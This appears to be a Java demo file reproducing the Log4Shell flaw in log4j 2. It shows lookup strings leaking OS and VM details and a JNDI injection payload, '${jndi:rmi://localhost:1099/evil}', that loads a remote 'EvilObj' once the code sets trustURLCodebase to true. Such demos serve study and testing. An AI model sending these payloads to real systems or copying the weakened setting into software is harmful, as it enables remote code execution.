package com.boyuan;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/*
    Reference https://www.bilibili.com/video/BV1FL411E7g3
 */
public class Log4j2Test {

    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

        String username = "${java:os}";

        LOGGER.info("Hello {}!", username);

        username = "${java:vm}";

        LOGGER.info("Hello {}!", username);

        /*
            Use log4j 2.14.0 version, the printed log:

            16:59:41.709 [main] INFO  com.boyuan.Log4j2Test - Hello Mac OS X 10.12.6 unknown, architecture: x86_64-64!
            16:59:41.712 [main] INFO  com.boyuan.Log4j2Test - Hello Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode)!

            Use log4j 2.15.0 version, the printed log:

            00:47:23.043 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:os}!
            00:47:23.045 [main] INFO  com.boyuan.Log4j2Test - Hello ${java:vm}!
        */

        username = "${jndi:rmi://localhost:1099/evil}";

        LOGGER.info("Hello {}!", username);

        /*
            Executing EvilObj...
         */
    }

}
